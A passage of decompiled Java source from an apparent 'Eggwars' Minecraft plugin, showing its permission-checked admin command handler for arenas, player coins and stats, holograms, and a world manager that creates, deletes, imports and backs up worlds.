                                             var39 = new File(this.getDataFolder() + "/arenas/" + var31.name, "locations.dat");
                                             var86 = YamlConfiguration.loadConfiguration(var39);
                                             if (!var31.villagers.isEmpty() && var86.getConfigurationSection("Villagers") != null && !var86.getConfigurationSection("Villagers").getKeys(false).isEmpty()) {
                                                var51 = var86.getConfigurationSection("Villagers").getKeys(false).size();
                                                Location var74 = this.getLocationFromString(var86.getString("Villagers." + var51));
                                                var86.set("Villagers." + var51, (Object)null);

                                                try {
                                                   var86.save(var39);
                                                } catch (IOException var22) {
                                                   var22.printStackTrace();
                                                }

                                                var31.villagers.remove(var74);
                                                var1.sendMessage(this.customization.prefix + "You have " + ChatColor.GREEN + "successfully" + ChatColor.GRAY + " removed the villager with the id of " + ChatColor.AQUA + "#" + var51 + ChatColor.GRAY + " from the arena " + ChatColor.LIGHT_PURPLE + var31.name + ChatColor.GRAY + "!");
                                                return true;
                                             } else {
                                                var1.sendMessage(this.customization.prefix + "The arena doesn't have any villagers!");
                                                return true;
                                             }
                                          }
                                       }
                                    } else {
                                       Player var35;
                                       if (var5.equals("setspectators")) {
                                          if (!this.checkSender(var1, true, "eggwars.setspectators")) {
                                             return true;
                                          } else if (var4.length < 2) {
                                             this.sendCommandUsage(var1, "Setspectators", "<Arena>");
                                             return true;
                                          } else {
                                             var29 = var4[1].toLowerCase();
                                             if (!this.arenas.containsKey(var29)) {
                                                var1.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                                return true;
                                             } else {
                                                var35 = (Player)var1;
                                                var8 = (Arena)this.arenas.get(var29);
                                                var40 = new File(this.getDataFolder() + "/arenas/" + var8.name, "locations.dat");
                                                var47 = YamlConfiguration.loadConfiguration(var40);
                                                var47.set("Spectators-Spawnpoint", this.getStringFromLocation(var35.getLocation(), true));

                                                try {
                                                   var47.save(var40);
                                                } catch (IOException var23) {
                                                   var23.printStackTrace();
                                                }

                                                var8.spectatorsLocation = var35.getLocation().getBlock().getLocation().add(0.5D, 1.0D, 0.5D);
                                                var35.sendMessage(this.customization.prefix + "You have set the spectators spawnpoint for the arena " + ChatColor.LIGHT_PURPLE + var8.name + ChatColor.GOLD + "!");
                                                return true;
                                             }
                                          }
                                       } else {
                                          String var63;
                                          final int var70;
                                          if (var5.equals("start")) {
                                             if (!this.checkSender(var1, false, "eggwars.start")) {
                                                return true;
                                             } else {
                                                if (var4.length == 1) {
                                                   if (!(var1 instanceof Player) || ((PlayerData)this.playerData.get(var1.getName())).arena == null) {
                                                      this.sendCommandUsage(var1, "Start", "<Name>");
                                                      return true;
                                                   }

                                                   var29 = ((PlayerData)this.playerData.get(var1.getName())).arena.name.toLowerCase();
                                                } else {
                                                   var29 = var4[1].toLowerCase();
                                                }

                                                if (!this.arenas.containsKey(var29)) {
                                                   var1.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                                   return true;
                                                } else {
                                                   var31 = (Arena)this.arenas.get(var29);
                                                   if (!var31.state.AVAILABLE()) {
                                                      var1.sendMessage(this.customization.prefix + "You may not start the arena in its current state!");
                                                      return true;
                                                   } else {
                                                      var70 = 0;
                                                      Iterator var76 = var31.teams.keySet().iterator();

                                                      while(var76.hasNext()) {
                                                         Team var83 = (Team)var76.next();
                                                         if (var83.getSize() > 0) {
                                                            ++var70;
                                                         }
                                                      }

                                                      var76 = var31.players.keySet().iterator();

                                                      while(var76.hasNext()) {
                                                         var63 = (String)var76.next();
                                                         if (var31.players.get(var63) == null) {
                                                            ++var70;
                                                         }
                                                      }

                                                      if (var70 < 2) {
                                                         var1.sendMessage(this.customization.prefix + "There must be at least 2 teams for the arena to start!");
                                                         return true;
                                                      } else {
                                                         var31.start();
                                                         var1.sendMessage(this.customization.prefix + "You have forced the arena " + ChatColor.YELLOW + var31.name + ChatColor.GOLD + " to start!");
                                                         return true;
                                                      }
                                                   }
                                                }
                                             }
                                          } else if (var5.equals("stop")) {
                                             if (!this.checkSender(var1, false, "eggwars.stop")) {
                                                return true;
                                             } else {
                                                if (var4.length == 1) {
                                                   if (!(var1 instanceof Player) || ((PlayerData)this.playerData.get(var1.getName())).arena == null) {
                                                      this.sendCommandUsage(var1, "Start", "<Name>");
                                                      return true;
                                                   }

                                                   var29 = ((PlayerData)this.playerData.get(var1.getName())).arena.name.toLowerCase();
                                                } else {
                                                   var29 = var4[1].toLowerCase();
                                                }

                                                if (!this.arenas.containsKey(var29)) {
                                                   var1.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                                   return true;
                                                } else {
                                                   var31 = (Arena)this.arenas.get(var29);
                                                   if (!var31.state.equals(Enums.ArenaState.INGAME) && !var31.state.equals(Enums.ArenaState.ENDING)) {
                                                      var1.sendMessage(this.customization.prefix + "You may not stop the arena in its current state!");
                                                      return true;
                                                   } else {
                                                      var31.stop(true);
                                                      var1.sendMessage(this.customization.prefix + "You have forced the arena " + ChatColor.YELLOW + var31.name + ChatColor.GRAY + " to stop!");
                                                      return true;
                                                   }
                                                }
                                             }
                                          } else if (var5.equals("coins")) {
                                             if (!this.checkSender(var1, false, "eggwars.coins")) {
                                                return true;
                                             } else if (var4.length >= 4 && ((var29 = var4[1].toLowerCase()).equals("add") || var29.equals("remove") || var29.equals("set")) && this.checkNumbers(var4[3])) {
                                                var35 = Bukkit.getPlayer(var4[2]);
                                                var70 = Integer.valueOf(var4[3]);
                                                if (var35 == null) {
                                                   var1.sendMessage(this.customization.prefix + "Couldn't find that players online, looking up the database...");
                                                   (new BukkitRunnable() {
                                                      boolean increment = !var29.equals("set");

                                                      public void run() {
                                                         try {
                                                            boolean var1x = Eggwars.api.modifyOfflinePlayerStat(var4[2], Enums.Stat.COINS, var29.equals("remove") ? -var70 : var70, this.increment);
                                                            if (var1x) {
                                                               var1.sendMessage(Eggwars.this.customization.prefix + ChatColor.YELLOW + var4[2] + ChatColor.GRAY + " coins were updated!");
                                                            } else {
                                                               var1.sendMessage(Eggwars.this.customization.prefix + "Couldn't find that player in the database!");
                                                            }
                                                         } catch (SQLException var2) {
                                                            var2.printStackTrace();
                                                         }

                                                      }
                                                   }).runTaskAsynchronously(this.plugin);
                                                   return true;
                                                } else {
                                                   PlayerData var81 = (PlayerData)this.playerData.get(var35.getName());
                                                   var51 = var81.getCoins(var35);
                                                   if (var29.equals("add")) {
                                                      var81.addCoins(var35, var70);
                                                   } else if (var29.equals("remove")) {
                                                      var81.removeCoins(var35, var70);
                                                   } else if (var29.equals("set")) {
                                                      var81.setCoins(var35, var70);
                                                   }

                                                   if (var51 != var81.getCoins(var35)) {
                                                      var1.sendMessage(this.customization.prefix + "You have " + ChatColor.GREEN + "successfully" + ChatColor.GRAY + " changed " + ChatColor.AQUA + var35.getName() + "'s" + ChatColor.GRAY + " coins!");
                                                      var35.sendMessage((String)this.customization.messages.get("Coins-Update") + (var81.getCoins(var35) - var51 > 0 ? ChatColor.GREEN + " (+" + (var81.getCoins(var35) - var51) + ")!" : ChatColor.RED + " (" + (var81.getCoins(var35) - var51) + ")!"));
                                                      if (var81.lobbyScoreboard != null) {
                                                         var81.lobbyScoreboard.update((String)this.customization.scoreboard.get("Coins"), var81.getCoins(var35), true);
                                                      }

                                                      var81.save = true;
                                                   } else {
                                                      var1.sendMessage(this.customization.prefix + "User coins haven't changed!");
                                                   }

                                                   return true;
                                                }
                                             } else {
                                                this.sendCommandUsage(var1, "Coins", "<Action> <Player> <Amount>", "Action can only be one of the following", "Add, Remove, Set");
                                                return true;
                                             }
                                          } else {
                                             int var46;
                                             if (var5.equals("setmodifier")) {
                                                if (!this.checkSender(var1, false, "eggwars.setmodifier")) {
                                                   return true;
                                                } else if (var4.length >= 3 && this.checkNumbers(var4[2])) {
                                                   var6 = Bukkit.getPlayer(var4[1]);
                                                   if (var6 == null) {
                                                      var1.sendMessage(this.customization.prefix + "Couldn't find a player with that name! looking up the database...");
                                                      (new BukkitRunnable() {
                                                         public void run() {
                                                            try {
                                                               boolean var1x = Eggwars.api.modifyOfflinePlayerStat(var4[1], Enums.Stat.MODIFIER, Integer.valueOf(var4[2]), false);
                                                               if (var1x) {
                                                                  var1.sendMessage(Eggwars.this.customization.prefix + ChatColor.YELLOW + var4[1] + ChatColor.GRAY + " modifier was updated!");
                                                               } else {
                                                                  var1.sendMessage(Eggwars.this.customization.prefix + "Couldn't find that player in the database!");
                                                               }
                                                            } catch (SQLException var2) {
                                                               var2.printStackTrace();
                                                            }

                                                         }
                                                      }).runTaskAsynchronously(this.plugin);
                                                      return true;
                                                   } else {
                                                      var52 = Integer.valueOf(var4[2]);
                                                      PlayerData var66 = (PlayerData)this.playerData.get(var6.getName());
                                                      var46 = var66.modifier;
                                                      if (var52 != var46) {
                                                         var66.modifier = var52;
                                                         var1.sendMessage(this.customization.prefix + "You have " + ChatColor.GREEN + "successfully" + ChatColor.GRAY + " changed " + ChatColor.YELLOW + var6.getName() + ChatColor.GRAY + " modifier to " + ChatColor.AQUA + var52 + ChatColor.GRAY + "!");
                                                         var6.sendMessage((String)this.customization.messages.get("Modifier-Update"));
                                                         var66.save = true;
                                                      } else {
                                                         var1.sendMessage(this.customization.prefix + "The player " + ChatColor.YELLOW + var6.getName() + ChatColor.GRAY + " already has this modifier!");
                                                      }

                                                      return true;
                                                   }
                                                } else {
                                                   this.sendCommandUsage(var1, "Setmodifier", "<Player> <Modifier>");
                                                   return true;
                                                }
                                             } else {
                                                Player var38;
                                                if (var5.equals("holograms")) {
                                                   if (!this.checkSender(var1, true, "eggwars.holograms")) {
                                                      return true;
                                                   } else if (var4.length >= 3 && ((var29 = var4[1].toLowerCase()).equals("set") || var29.equals("remove")) && ((var7 = var4[2].toLowerCase()).equals("stats") || var7.equals("leaderboard"))) {
                                                      if (this.hologramsManager == null) {
                                                         var1.sendMessage(this.customization.prefix + "HolographicDisplays doesn't seem to be loaded!");
                                                         return true;
                                                      } else {
                                                         var38 = (Player)var1;
                                                         if (var29.equals("set")) {
                                                            Location var72 = var38.getLocation();
                                                            if (var7.equals("stats")) {
                                                               var72.add(0.0D, 4.0D, 0.0D);
                                                               this.hologramsManager.setStats(var72);
                                                               this.getConfig().set("Holographic-Stats", this.getStringFromLocation(var72, false));
                                                               var38.sendMessage(this.customization.prefix + "You have set the holographic stats location!");
                                                            } else {
                                                               var72.add(0.0D, 3.0D, 0.0D);
                                                               this.hologramsManager.setLeaderboard(var72, true);
                                                               this.getConfig().set("Holographic-Leaderboard", this.getStringFromLocation(var72, false));
                                                               var38.sendMessage(this.customization.prefix + "You have set the holographic leaderboard location!");
                                                            }
                                                         } else if (var7.equals("stats")) {
                                                            this.hologramsManager.setStats((Location)null);
                                                            this.getConfig().set("Holographic-Stats", (Object)null);
                                                            var38.sendMessage(this.customization.prefix + "You have removed the holographic stats location!");
                                                         } else {
                                                            this.hologramsManager.setLeaderboard((Location)null, false);
                                                            this.getConfig().set("Holographic-Leaderboard", (Object)null);
                                                            var38.sendMessage(this.customization.prefix + "You have removed the holographic leaderboard location!");
                                                         }

                                                         this.saveConfig();
                                                         return true;
                                                      }
                                                   } else {
                                                      this.sendCommandUsage(var1, "Holograms", "Set/Remove Stats/Leaderboard");
                                                      return true;
                                                   }
                                                } else if (var5.equals("reset")) {
                                                   if (!this.checkSender(var1, false, "eggwars.reset")) {
                                                      return true;
                                                   } else if (var4.length == 1) {
                                                      this.sendCommandUsage(var1, "Reset", "<Player>");
                                                      return true;
                                                   } else {
                                                      var6 = Bukkit.getPlayer(var4[1]);
                                                      final long var49 = System.currentTimeMillis();
                                                      var1.sendMessage(this.customization.prefix + "Looking up the database...");
                                                      (new BukkitRunnable() {
                                                         public void run() {
                                                            boolean var1x = false;
                                                            if (Eggwars.this.config.mysql_enabled) {
                                                               try {
                                                                  Connection var2 = Eggwars.this.mysql.getConnection();
                                                                  PreparedStatement var3 = var2.prepareStatement(Eggwars.this.mysql.SELECT);
                                                                  var3.setString(1, var4[1]);
                                                                  ResultSet var4x = var3.executeQuery();
                                                                  if (var4x.next()) {
                                                                     var3 = var2.prepareStatement(Eggwars.this.mysql.DELETE_PLAYER);
                                                                     var3.setString(1, var4[1]);
                                                                     var3.execute();
                                                                     var1x = true;
                                                                  }

                                                                  var4x.close();
                                                                  var3.close();
                                                               } catch (SQLException var5) {
                                                                  var5.printStackTrace();
                                                               }
                                                            } else {
                                                               Iterator var7 = Eggwars.api.getPlayersFiles().iterator();

                                                               while(var7.hasNext()) {
                                                                  File var6x = (File)var7.next();
                                                                  String var8 = Eggwars.this.config.useUUID ? YamlConfiguration.loadConfiguration(var6x).getString("Name") : var6x.getName();
                                                                  if (var8.equalsIgnoreCase(var4[1])) {
                                                                     var6x.delete();
                                                                     var1x = true;
                                                                     break;
                                                                  }
                                                               }
                                                            }

                                                            if (!var1x && var6 == null) {
                                                               var1.sendMessage(Eggwars.this.customization.prefix + "Couldn't find that player in the database!");
                                                            } else {
                                                               if (var6 != null) {
                                                                  ((PlayerData)Eggwars.this.playerData.get(var6.getName())).load(var6);
                                                                  ((PlayerData)Eggwars.this.playerData.get(var6.getName())).save = true;
                                                               }

                                                               var1.sendMessage(Eggwars.this.customization.prefix + "Player stats have been reset! took " + ChatColor.LIGHT_PURPLE + (System.currentTimeMillis() - var49) + "ms!");
                                                            }

                                                         }
                                                      }).runTaskAsynchronously(this);
                                                      return true;
                                                   }
                                                } else if (var5.equals("edit")) {
                                                   if (!this.checkSender(var1, true, "eggwars.edit")) {
                                                      return true;
                                                   } else if (var4.length == 1) {
                                                      this.sendCommandUsage(var1, "Edit", "<Name>");
                                                      return true;
                                                   } else {
                                                      var6 = (Player)var1;
                                                      var7 = var4[1].toLowerCase();
                                                      if (!this.arenas.containsKey(var7)) {
                                                         var6.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                                         return true;
                                                      } else {
                                                         var6.openInventory(((Arena)this.arenas.get(var7)).editor);
                                                         return true;
                                                      }
                                                   }
                                                } else if (var5.equals("editmode")) {
                                                   if (!this.checkSender(var1, true, "eggwars.editmode")) {
                                                      return true;
                                                   } else {
                                                      var6 = (Player)var1;
                                                      if (!this.config.bungee_mode_enabled) {
                                                         var6.sendMessage(this.customization.prefix + "You must be in BungeeMode to use this command!");
                                                         return true;
                                                      } else {
                                                         if (this.players.contains(var6.getName())) {
                                                            var6.sendMessage(this.customization.prefix + "You have " + ChatColor.GREEN + "enabled" + ChatColor.GRAY + " the editing mode!");
                                                            var7 = this.config.bungee_mode_hub;
                                                            this.config.bungee_mode_hub = String.valueOf(this.r.nextInt());
                                                            this.leave(var6, true);
                                                            this.config.bungee_mode_hub = var7;
                                                         } else if (this.plugin.lobbyLocation != null) {
                                                            var6.sendMessage(this.customization.prefix + "You have " + ChatColor.RED + "disabled" + ChatColor.GRAY + " the editing mode!");
                                                            this.join(var6);
                                                         } else {
                                                            var6.sendMessage((String)this.plugin.customization.messages.get("Lobby-Not-Set"));
                                                         }

                                                         return true;
                                                      }
                                                   }
                                                } else {
                                                   final long var44;
                                                   if (var5.equals("reload")) {
                                                      if (!this.checkSender(var1, false, "eggwars.reload")) {
                                                         return true;
                                                      } else {
                                                         var1.sendMessage(this.customization.prefix + "Attempting to reload the plugin!");
                                                         long var32 = System.currentTimeMillis();
                                                         var43 = this.getPlayers(this.players).iterator();

                                                         while(var43.hasNext()) {
                                                            var38 = (Player)var43.next();
                                                            this.leave(var38, true);
                                                            var38.sendMessage((String)this.customization.messages.get("Reload-Kick"));
                                                         }

                                                         this.mainSetup();
                                                         var44 = System.currentTimeMillis();
                                                         var1.sendMessage(this.customization.prefix + "The plugin has been " + ChatColor.GREEN + "successfully" + ChatColor.GRAY + " reloaded! took " + ChatColor.LIGHT_PURPLE + (var44 - var32) + "ms!");
                                                         return true;
                                                      }
                                                   } else if (var5.equals("updateregion")) {
                                                      if (!this.checkSender(var1, true, "eggwars.updateregion")) {
                                                         return true;
                                                      } else if (var4.length == 1) {
                                                         this.sendCommandUsage(var1, "Updateregion", "<Arena>");
                                                         return true;
                                                      } else {
                                                         var6 = (Player)var1;
                                                         var7 = var4[1];
                                                         if (!this.arenas.containsKey(var7.toLowerCase())) {
                                                            var6.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                                            return true;
                                                         } else if (this.selectionMode.containsKey(var6.getName()) && ((Location[])this.selectionMode.get(var6.getName()))[0] != null && ((Location[])this.selectionMode.get(var6.getName()))[1] != null) {
                                                            var53 = new Cuboid(((Location[])this.selectionMode.get(var6.getName()))[0], ((Location[])this.selectionMode.get(var6.getName()))[1]);
                                                            if (var53.getSize() > this.config.maxArenaSize) {
                                                               var6.sendMessage(this.customization.prefix + "Your current selection exceeds the max arena size set in the config! " + ChatColor.LIGHT_PURPLE + "(" + var53.getSize() + "/" + this.config.maxArenaSize + ")!");
                                                               return true;
                                                            } else {
                                                               var6.sendMessage(this.customization.prefix + "Updating the arena region...");
                                                               var67 = (Arena)this.arenas.get(var7.toLowerCase());
                                                               var67.enabled = false;
                                                               var67.stop(false);
                                                               new ArenaSaveBlocksTask(this, var6, var67.name, var53);
                                                               return true;
                                                            }
                                                         } else {
                                                            var6.sendMessage(this.customization.prefix + "You haven't selected the 2 corners yet!");
                                                            return true;
                                                         }
                                                      }
                                                   } else if (!var5.equals("worldmanager") && !var5.equals("wm")) {
                                                      var1.sendMessage((String)this.customization.messages.get("Unknown-Command"));
                                                      return false;
                                                   } else if (!this.checkSender(var1, false, "eggwars.worldmanager")) {
                                                      return true;
                                                   } else if (var4.length == 1) {
                                                      var30 = this.colors[this.r.nextInt(this.colors.length)];
                                                      var1.sendMessage("" + var30 + ChatColor.STRIKETHROUGH + "------------" + ChatColor.YELLOW + " Eggwars " + ChatColor.RED + "WorldManager " + var30 + ChatColor.STRIKETHROUGH + "------------");
                                                      var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew WorldManager Create <World> " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Creates a new world");
                                                      var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew WorldManager Delete <World> " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Deletes an existing world");
                                                      var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew WorldManager Import <World> " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Imports a new world!");
                                                      var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew WorldManager Backup <World> " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Creates a backup of a world");
                                                      var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew WorldManager Restore <World> " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Restores a world from the backup file");
                                                      var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew WorldManager Tp <World> " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Teleports you to a world");
                                                      var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew WorldManager Setspawn <World> " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Sets the spawn of a world");
                                                      var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew WorldManager Backupall " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Creates a backup of all loaded worlds");
                                                      var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew WorldManager List " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Lists loaded worlds!");
                                                      var1.sendMessage("" + var30 + ChatColor.STRIKETHROUGH + "--------------------------------------------");
                                                      return true;
                                                   } else {
                                                      var29 = var4[1].toLowerCase();
                                                      final List var37;
                                                      String var42;
                                                      long var60;
                                                      int var64;
                                                      if (var29.equals("create")) {
                                                         var37 = Arrays.asList("normal", "nether", "the_end", "empty");
                                                         if (var4.length >= 4 && var37.contains(var4[3].toLowerCase())) {
                                                            var42 = var4[2];
                                                            var63 = var4[3].toLowerCase();
                                                            if (Bukkit.getWorld(var42) != null) {
                                                               var1.sendMessage(this.customization.prefix + "There is a world with that name!");
                                                               return true;
                                                            } else {
                                                               String[] var71;
                                                               var64 = (var71 = Bukkit.getWorldContainer().list()).length;

                                                               for(var59 = 0; var59 < var64; ++var59) {
                                                                  String var65 = var71[var59];
                                                                  if (var65.equalsIgnoreCase(var42)) {
                                                                     var1.sendMessage(this.customization.prefix + "Seems like there is an unloaded world with that name! try using /ew WorldManager Import <Name>");
                                                                     return true;
                                                                  }
                                                               }

                                                               var1.sendMessage(this.customization.prefix + "Creating a new world!");
                                                               var60 = System.currentTimeMillis();
                                                               if (var63.equals("empty")) {
                                                                  Bukkit.createWorld((new WorldCreator(var42)).generator(new ChunkGenerator() {
                                                                     public byte[][] generateBlockSections(World var1, Random var2, int var3, int var4, BiomeGrid var5) {
                                                                        return new byte[var1.getMaxHeight() / 16][];
                                                                     }
                                                                  }));
                                                               } else {
                                                                  Bukkit.createWorld((new WorldCreator(var42)).environment(Environment.valueOf(var63.toUpperCase())));
                                                               }

                                                               var1.sendMessage(this.customization.prefix + "World has been created! took " + ChatColor.LIGHT_PURPLE + (System.currentTimeMillis() - var60) + "ms" + ChatColor.GRAY + " to complete the process! use " + ChatColor.GREEN + "/ew WorldManager Tp " + var42 + ChatColor.GRAY + " if you would like to be teleported to that world!");
                                                               return true;
                                                            }
                                                         } else {
                                                            this.sendCommandUsage(var1, "WorldManager Create", "<Name> <Type>", "Type can be normal, nether, the_end, empty");
                                                            return true;
                                                         }
                                                      } else {
                                                         World var41;
                                                         if (var29.equals("delete")) {
                                                            if (var4.length == 2) {
                                                               this.sendCommandUsage(var1, "WorldManager Delete", "<Name>");
                                                               return true;
                                                            } else {
                                                               var7 = var4[2].toLowerCase();
                                                               var41 = Bukkit.getWorld(var7);
                                                               var40 = null;
                                                               if (var41 != null) {
                                                                  if (!var41.getPlayers().isEmpty()) {
                                                                     var1.sendMessage(this.customization.prefix + "The world contains players. so the world can't be deleted!");
                                                                     Iterator var57 = var41.getPlayers().iterator();

                                                                     while(var57.hasNext()) {
                                                                        Player var55 = (Player)var57.next();
                                                                        var1.sendMessage(this.customization.prefix + "- " + var55.getName());
                                                                     }

                                                                     return true;
                                                                  }

                                                                  var40 = var41.getWorldFolder();
                                                                  Bukkit.unloadWorld(var41, false);
                                                               } else {
                                                                  var1.sendMessage(this.customization.prefix + "The world you looking for seems to be unloaded, looking up folders...");
                                                                  File[] var68;
                                                                  var64 = (var68 = Bukkit.getWorldContainer().listFiles()).length;

                                                                  for(var59 = 0; var59 < var64; ++var59) {
                                                                     File var58 = var68[var59];
                                                                     if (var58.getName().equalsIgnoreCase(var4[2])) {
                                                                        var40 = var58;
                                                                        break;
                                                                     }
                                                                  }
                                                               }

                                                               if (var40 != null) {
                                                                  var60 = System.currentTimeMillis();
                                                                  this.filesManager.deleteFile(var40);
                                                                  var1.sendMessage(this.customization.prefix + "World has been deleted! took " + ChatColor.LIGHT_PURPLE + (System.currentTimeMillis() - var60) + "ms!");
                                                               } else {
                                                                  var1.sendMessage(this.customization.prefix + "Couldn't find a world with that name!");
                                                               }

                                                               return true;
                                                            }
                                                         } else if (var29.equals("import")) {
                                                            if (var4.length == 2) {
                                                               this.sendCommandUsage(var1, "WorldManager Import", "<Name>");
                                                               return true;
                                                            } else {
                                                               var7 = var4[2];
                                                               if (Bukkit.getWorld(var7) != null) {
                                                                  var1.sendMessage(this.customization.prefix + "There is a loaded world with that name!");
                                                                  return true;
                                                               } else {
                                                                  String[] var54;
                                                                  var51 = (var54 = Bukkit.getWorldContainer().list()).length;

                                                                  for(var46 = 0; var46 < var51; ++var46) {
                                                                     var42 = var54[var46];
                                                                     if (var7.equalsIgnoreCase(var42)) {
                                                                        var1.sendMessage(this.customization.prefix + "Importing the world...");
                                                                        long var61 = System.currentTimeMillis();
                                                                        if (this.config.emptyChunkGenerator) {
                                                                           Bukkit.createWorld((new WorldCreator(var42)).generator(new ChunkGenerator() {
                                                                              public byte[][] generateBlockSections(World var1, Random var2, int var3, int var4, BiomeGrid var5) {
                                                                                 return new byte[var1.getMaxHeight() / 16][];
                                                                              }
                                                                           }));
                                                                        } else {
                                                                           Bukkit.createWorld(new WorldCreator(var42));
                                                                        }

                                                                        var1.sendMessage(this.customization.prefix + "World has been imported! check your logs! took " + ChatColor.LIGHT_PURPLE + (System.currentTimeMillis() - var61) + "ms!");
                                                                        return true;
                                                                     }
                                                                  }

                                                                  var1.sendMessage(this.customization.prefix + "Couldn't find any world with that name!");
                                                                  return true;
                                                               }
                                                            }
                                                         } else if (!var29.equals("backup") && !var29.equals("restore")) {
                                                            if (var29.equals("backupall")) {
                                                               if (!this.checkSender(var1, false, "eggwars.worldmanager")) {
                                                                  return true;
                                                               } else {
                                                                  var37 = Bukkit.getWorlds();
                                                                  var1.sendMessage(this.customization.prefix + ChatColor.GREEN + "Creating a backup of all loaded worlds " + ChatColor.GOLD + "(" + var37.size() + ")" + ChatColor.GREEN + "!");
                                                                  var44 = System.currentTimeMillis();
                                                                  (new BukkitRunnable() {
                                                                     int i = 0;
                                                                     boolean busy = false;

                                                                     public void run() {
                                                                        if (this.i >= var37.size()) {
                                                                           var1.sendMessage(Eggwars.this.customization.prefix + ChatColor.GREEN + "A backup for " + ChatColor.GOLD + "(" + this.i + ")" + ChatColor.GREEN + " worlds has been created! " + ChatColor.LIGHT_PURPLE + "Took: " + (System.currentTimeMillis() - var44) + "ms");
                                                                           this.cancel();
                                                                        } else {
                                                                           if (!this.busy) {
                                                                              World var1x = (World)var37.get(this.i);
                                                                              this.busy = true;
                                                                              var1.sendMessage(Eggwars.this.customization.prefix + "Creating a backup for the world " + ChatColor.AQUA + var1x.getName());
                                                                              var1x.save();
                                                                              Eggwars.this.filesManager.copyFile(var1x.getWorldFolder(), new File(Eggwars.this.getDataFolder() + "/backup", var1x.getName()));
                                                                              this.busy = false;
                                                                              ++this.i;
                                                                           }

                                                                        }
                                                                     }
                                                                  }).runTaskTimerAsynchronously(this, 0L, 20L);
                                                                  return true;
                                                               }
                                                            } else if (var29.equals("tp")) {
                                                               if (!this.checkSender(var1, true, "eggwars.worldmanager")) {
                                                                  return true;
                                                               } else if (var4.length == 2) {
                                                                  this.sendCommandUsage(var1, "WorldManager Tp", "<Name>");
                                                                  return true;
                                                               } else {
                                                                  var35 = (Player)var1;
                                                                  var42 = var4[2];
                                                                  if (Bukkit.getWorld(var42) == null) {
                                                                     var35.sendMessage(this.customization.prefix + "Couldn't find a world with that name!");
                                                                     return true;
                                                                  } else {
                                                                     var35.teleport(Bukkit.getWorld(var42).getSpawnLocation());
                                                                     var35.sendMessage(this.customization.prefix + "You have been teleported to " + ChatColor.GREEN + var42 + ChatColor.GRAY + "!");
                                                                     return true;
                                                                  }
                                                               }
                                                            } else if (var29.equals("setspawn")) {
                                                               if (!this.checkSender(var1, true, "eggwars.worldmanager")) {
                                                                  return true;
                                                               } else if (var4.length == 2) {
                                                                  this.sendCommandUsage(var1, "WorldManager Setspawn", "<Name>");
                                                                  return true;
                                                               } else {
                                                                  var35 = (Player)var1;
                                                                  var42 = var4[2];
                                                                  World var45 = Bukkit.getWorld(var42);
                                                                  if (var45 == null) {
                                                                     var35.sendMessage(this.customization.prefix + "Couldn't find a world with that name!");
                                                                     return true;
                                                                  } else if (!var45.getName().equals(var35.getWorld().getName())) {
                                                                     var35.sendMessage(this.customization.prefix + "You are not in that world to set its spawn!");
                                                                     return true;
                                                                  } else {
                                                                     var45.setSpawnLocation(var35.getLocation().getBlockX(), var35.getLocation().getBlockY() + 1, var35.getLocation().getBlockZ());
                                                                     var35.sendMessage(this.customization.prefix + "You have set the world spawn location!");
                                                                     return true;
                                                                  }
                                                               }
                                                            } else if (!var29.equals("list")) {
                                                               var1.sendMessage(this.customization.prefix + "Unknown command! use /ew WorldManager for a list of commands");
                                                               return true;
                                                            } else {
                                                               ChatColor var34 = this.colors[this.r.nextInt(this.colors.length)];
                                                               var1.sendMessage("" + var34 + ChatColor.STRIKETHROUGH + "------------" + ChatColor.YELLOW + " Eggwars " + ChatColor.RED + "WorldManager " + var34 + ChatColor.STRIKETHROUGH + "------------");
                                                               var1.sendMessage(this.customization.prefix + "Loaded worlds: " + ChatColor.LIGHT_PURPLE + Bukkit.getWorlds().size());
                                                               var43 = Bukkit.getWorlds().iterator();

                                                               while(var43.hasNext()) {
                                                                  var41 = (World)var43.next();
                                                                  var1.sendMessage(ChatColor.AQUA + "- " + ChatColor.LIGHT_PURPLE + var41.getName() + ChatColor.DARK_AQUA + " -> " + ChatColor.RED + "Environment: " + ChatColor.AQUA + var41.getEnvironment().name() + ", " + ChatColor.YELLOW + "Difficulty: " + ChatColor.AQUA + var41.getDifficulty().name() + ", " + ChatColor.GREEN + "PVP: " + ChatColor.AQUA + var41.getPVP() + ", " + ChatColor.DARK_AQUA + "Players: " + ChatColor.AQUA + var41.getPlayers().size());
                                                               }

                                                               var1.sendMessage("" + var34 + ChatColor.STRIKETHROUGH + "--------------------------------------------");
                                                               return true;
                                                            }
                                                         } else if (var4.length == 2) {
                                                            this.sendCommandUsage(var1, "WorldManager " + var29.substring(0, 1).toUpperCase() + var29.substring(1, var29.length()), "<Name>");
                                                            return true;
                                                         } else {
                                                            final World var33 = Bukkit.getWorld(var4[2]);
                                                            if (var33 == null) {
                                                               var1.sendMessage(this.customization.prefix + "Couldn't find a loaded world with that name!");
                                                               return true;
                                                            } else if (var29.equals("backup")) {
                                                               (new BukkitRunnable() {
                                                                  public void run() {
                                                                     var1.sendMessage(Eggwars.this.customization.prefix + "Creating a backup of the world " + ChatColor.GREEN + var33.getName() + ChatColor.GRAY + "!");
                                                                     long var1x = System.currentTimeMillis();
                                                                     var33.save();
